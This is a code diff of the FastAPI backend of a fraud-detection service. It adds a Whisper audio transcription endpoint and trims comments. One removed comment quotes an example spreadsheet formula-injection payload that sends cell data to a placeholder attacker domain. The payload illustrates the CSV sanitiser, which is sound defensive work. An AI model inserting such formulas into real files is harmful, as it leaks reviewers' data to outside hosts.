@@ -3,15 +3,13 @@ app.py
 The Fraud Shield backend server.
 
 Endpoints:
-  /assess   -> score a transaction (payment + optional call transcript),
-               return decision, PER-SIGNAL attribution, confidence,
-               privacy manifest and latency
-  /decision -> record what the user chose (confirm / cancel) into the audit log
-  /outcome  -> record the real-world result of a flagged payment (feedback loop)
-  /audit    -> return the audit log + summary for the bank review console
-  /stats    -> compute live precision/recall over the whole dataset
-
-The audit log is a running record for banks to review later.
+  /assess       -> score a transaction (payment + optional call transcript)
+  /transcribe   -> turn real call audio into text via Whisper
+  /capabilities -> tell the UI whether speech-to-text is usable right now
+  /decision     -> record what the user chose (confirm / cancel)
+  /outcome      -> record the real-world result of a flagged payment
+  /audit        -> return the audit log + summary for the bank review console
+  /stats        -> compute live precision/recall over the whole dataset
 """
 
 import csv
@@ -19,10 +17,11 @@ import os
 import time
 from datetime import datetime
 
-from fastapi import FastAPI
+from fastapi import FastAPI, File, Form, UploadFile
 from fastapi.staticfiles import StaticFiles
 from pydantic import BaseModel, Field
 
+import transcription
 from risk_engine import (
     build_user_profile,
     assess_transaction,
@@ -44,31 +43,26 @@ AUDIT_HEADER = [
     "confidence", "signal_count", "outcome",
 ]
 
-# How much of the voice-phishing score folds into the payment score.
-# A coercive call is strong evidence, but the payment itself still leads.
 VOICE_WEIGHT = 0.6
 
-# Only these values may ever be written to the outcome column.
 VALID_OUTCOMES = {"PENDING", "CONFIRMED_FRAUD", "CONFIRMED_LEGITIMATE", "UNKNOWN"}
+
+# Uploaded audio larger than this is refused before it reaches the model.
+MAX_UPLOAD_BYTES = 25 * 1024 * 1024
 
 
 # ---------------------------------------------------------------------------
 # CSV SAFETY
 #
-# A spreadsheet treats a cell beginning with = + - or @ as a FORMULA, not
-# text. Since the audit log is meant to be opened by a bank reviewer in
-# Excel, an attacker who controls a payee name could write something like
-#   =HYPERLINK("https://evil.example/"&A1,"click")
-# and have it execute the moment the reviewer opens the file. Prefixing a
-# single quote makes the spreadsheet treat the value as plain text.
-# Control characters are stripped so a value cannot break the row apart.
+# A spreadsheet treats a cell beginning with = + - or @ as a FORMULA. Since
+# the audit log is meant to be opened by a bank reviewer in Excel, a payee
+# name could otherwise execute on open. Prefixing a quote forces plain text.
 # ---------------------------------------------------------------------------
 def csv_safe(value):
     """Neutralise spreadsheet formula injection in a value bound for CSV."""
     if value is None:
         return ""
     text = str(value)
-    # strip characters that can break row/column structure or trigger formulas
     text = text.replace("\r", " ").replace("\n", " ").replace("\t", " ")
     if text[:1] in ("=", "+", "-", "@"):
         text = "'" + text
@@ -81,7 +75,6 @@ def load_profiles():
     history_by_user = {}
     with open("transactions.csv", newline="") as f:
         for tx in csv.DictReader(f):
-            # only learn from genuine (non-fraud) history for clean profiles
             if int(tx["is_fraud"]) == 0:
                 history_by_user.setdefault(tx["user_id"], []).append(tx)
     return {uid: build_user_profile(hist) for uid, hist in history_by_user.items()}
@@ -92,10 +85,6 @@ PROFILES = load_profiles()
 
 # ---------------------------------------------------------------------------
 # REQUEST SHAPES
-#
-# Length limits are deliberate: without them a single request could carry a
-# multi-megabyte transcript, which both exhausts memory and multiplies the
-# work done by every phrase scan in the voice detector.
 # ---------------------------------------------------------------------------
 class Transaction(BaseModel):
     user_id: str = Field(..., max_length=50)
@@ -104,24 +93,23 @@ class Transaction(BaseModel):
     city: str = Field(..., max_length=100)
     device: str = Field(..., max_length=100)
     timestamp: str = Field(..., max_length=40)
-    transcript: str = Field("", max_length=5000)     # optional call transcript
-    accessibility_service_active: bool = False       # screen-control app running
+    transcript: str = Field("", max_length=5000)
+    accessibility_service_active: bool = False
 
 
 class Decision(BaseModel):
     user_id: str = Field(..., max_length=50)
     amount: float = Field(..., ge=0, le=10_000_000)
     payee: str = Field(..., max_length=200)
-    decision: str = Field(..., max_length=20)   # APPROVE / WARN / BLOCK
+    decision: str = Field(..., max_length=20)
     score: int = Field(..., ge=0, le=100)
-    user_action: str = Field(..., max_length=20)  # CONFIRMED / CANCELLED
+    user_action: str = Field(..., max_length=20)
     confidence: str = Field("", max_length=20)
     signal_count: int = Field(0, ge=0, le=100)
 
 
 class Outcome(BaseModel):
-    """What actually happened, recorded later by a bank reviewer."""
-    row_index: int = Field(..., ge=0)   # position in the audit log (newest-first)
+    row_index: int = Field(..., ge=0)
     outcome: str = Field(..., max_length=40)
 
 
@@ -129,15 +117,14 @@ class Outcome(BaseModel):
 def voice_signals_as_attribution(voice):
     """
     Split the weighted voice contribution across the individual call red flags,
-    so each one shows its own point value instead of hiding inside a fused
-    score. The TOTAL stays identical to int(voice_score * VOICE_WEIGHT).
+    so each carries its own point value instead of hiding inside a fused score.
+    The TOTAL stays identical to int(voice_score * VOICE_WEIGHT).
     """
     signals = voice.get("voice_signals", []) or []
     total_points = int(voice.get("voice_score", 0) * VOICE_WEIGHT)
     if not signals or total_points <= 0:
         return []
 
-    # If the detector already assigns weights, respect them proportionally.
     weights = [float(s.get("points", s.get("weight", 1)) or 1) for s in signals]
     weight_sum = sum(weights) or len(signals)
 
@@ -145,7 +132,7 @@ def voice_signals_as_attribution(voice):
     allocated = 0
     for i, sig in enumerate(signals):
         if i == len(signals) - 1:
-            pts = total_points - allocated      # last one absorbs rounding
+            pts = total_points - allocated
         else:
             pts = int(round(total_points * weights[i] / weight_sum))
             allocated += pts
@@ -160,14 +147,58 @@ def voice_signals_as_attribution(voice):
     return out
 
 
-# ---- Action 1: assess a transaction (payment behaviour + voice phishing) ----
+# ---------------------------------------------------------------------------
+# Action 0: what can this server actually do?
+#
+# The UI asks this on load so it can offer audio input only when Whisper is
+# genuinely usable, and fall back to preset transcripts when it is not.
+# ---------------------------------------------------------------------------
+@app.get("/capabilities")
+def capabilities():
+    return {"transcription": transcription.status()}
+
+
+# ---------------------------------------------------------------------------
+# Action 1: real call audio -> text
+#
+# This is the only machine-learning component in the system: Whisper, a
+# transformer trained on a large corpus of speech. It does NOT make any fraud
+# decision - it only produces the transcript that the existing rule-based
+# voice engine then scans. The scoring logic is untouched.
+#
+# The audio itself is never stored: it is written to a temp file, read once,
+# and deleted. Only the derived text continues through the pipeline.
+# ---------------------------------------------------------------------------
+@app.post("/transcribe")
+async def transcribe(audio: UploadFile = File(...), language: str = Form("")):
+    data = await audio.read()
+
+    if len(data) > MAX_UPLOAD_BYTES:
+        return {"ok": False,
+                "error": f"Audio is too large (limit {MAX_UPLOAD_BYTES // (1024*1024)} MB)."}
+
+    result = transcription.transcribe_audio(
+        data,
+        filename=audio.filename or "audio.wav",
+        language=(language or None),
+    )
+
+    # If audio was understood but contained no speech, say so plainly rather
+    # than handing an empty string to the fraud engine.
+    if result.get("ok") and not result.get("transcript"):
+        result["ok"] = False
+        result["error"] = "No speech detected in that audio."
+
+    return result
+
+
+# ---- Action 2: assess a transaction (payment behaviour + voice phishing) ----
 @app.post("/assess")
 def assess(tx: Transaction):
     started = time.perf_counter()
     profile = PROFILES.get(tx.user_id)
     tx_data = tx.model_dump()
 
-    # --- 1. Payment-behaviour risk ---
     if profile is None:
         payment = {
             "score": 0, "decision": "APPROVE",
@@ -184,27 +215,19 @@ def assess(tx: Transaction):
     else:
         payment = assess_transaction(tx_data, profile)
 
-    # --- 2. Voice-phishing risk from the call transcript (if any) ---
     voice = analyse_transcript(tx.transcript)
-
-    # --- 3. Fuse into ONE decomposed attribution list ---
-    # Same arithmetic as before, but every signal now carries its own points
-    # so the explanation is feature-level, not a single fused paragraph.
     result = merge_external_signals(payment, voice_signals_as_attribution(voice))
 
     total_latency = round((time.perf_counter() - started) * 1000, 2)
-
     reasons = result["reasons"] if result["reasons"] else ["No suspicious signals detected"]
 
     return {
-        # --- original keys, unchanged ---
         "score": result["score"],
         "decision": result["decision"],
         "reasons": reasons,
         "payment_score": payment["score"],
         "voice_score": voice["voice_score"],
         "voice_level": voice["voice_level"],
-        # --- new: explainability, confidence, privacy, latency ---
         "signals": result["signals"],
         "raw_score": result["raw_score"],
         "capped": result["capped"],
@@ -216,7 +239,7 @@ def assess(tx: Transaction):
     }
 
 
-# ---- Action 2: record the human's decision into the audit log ----
+# ---- Action 3: record the human's decision into the audit log ----
 @app.post("/decision")
 def record_decision(d: Decision):
     file_exists = os.path.exists(AUDIT_FILE)
@@ -239,16 +262,13 @@ def record_decision(d: Decision):
     return {"status": "logged"}
 
 
-# ---- Action 3: bank reviewer records what actually happened ----
+# ---- Action 4: bank reviewer records what actually happened ----
 @app.post("/outcome")
 def record_outcome(o: Outcome):
     """
     Closes the feedback loop the problem statement asks for: when a user
     overrides a warning, the bank can later mark whether it really was fraud.
-    Those marks are what a future model would learn from.
     """
-    # Only a fixed set of outcome values is ever accepted, so nothing
-    # arbitrary can be written into the audit trail.
     if o.outcome not in VALID_OUTCOMES:
         return {"status": "invalid outcome"}
 
@@ -261,7 +281,6 @@ def record_outcome(o: Outcome):
         return {"status": "empty"}
 
     header, body = rows[0], rows[1:]
-    # UI shows newest first, so translate that index back to file order
     target = len(body) - 1 - o.row_index
     if target < 0 or target >= len(body):
         return {"status": "bad index"}
@@ -277,17 +296,15 @@ def record_outcome(o: Outcome):
     return {"status": "updated", "outcome": o.outcome}
 
 
-# ---- Action 4: return the audit log for the bank review dashboard ----
+# ---- Action 5: return the audit log for the bank review dashboard ----
 @app.get("/audit")
 def get_audit():
     rows = []
     if os.path.exists(AUDIT_FILE):
         with open(AUDIT_FILE, newline="") as f:
             rows = list(csv.DictReader(f))
-    # newest first
     rows.reverse()
 
-    # tolerate rows written before the newer columns existed
     for r in rows:
         r.setdefault("confidence", "")
         r.setdefault("signal_count", "")
@@ -298,7 +315,6 @@ def get_audit():
     total = len(rows)
     blocked = sum(1 for r in rows if r["shield_decision"] == "BLOCK")
     warned = sum(1 for r in rows if r["shield_decision"] == "WARN")
-    # "overrides": the shield warned/blocked but the user confirmed anyway
     overrides = sum(1 for r in rows
                     if r["shield_decision"] in ("WARN", "BLOCK") and r["user_action"] == "CONFIRMED")
     confirmed_fraud = sum(1 for r in rows if r["outcome"] == "CONFIRMED_FRAUD")
@@ -319,7 +335,7 @@ def get_audit():
     }
 
 
-# ---- Action 5: compute live detection metrics over the whole dataset ----
+# ---- Action 6: compute live detection metrics over the whole dataset ----
 @app.get("/stats")
 def get_stats():
     """
